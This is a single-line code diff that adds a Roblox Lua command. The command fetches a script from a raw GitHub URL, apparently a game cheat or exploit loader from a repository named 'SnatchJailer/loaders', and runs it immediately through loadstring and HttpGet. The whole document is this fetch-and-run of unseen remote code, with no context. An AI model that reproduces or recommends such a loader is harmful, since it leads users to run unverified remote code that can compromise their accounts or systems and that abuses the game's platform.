@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/upd-heavyweight-fishing-spam7-5y4hcz16o4batu.lua"))()
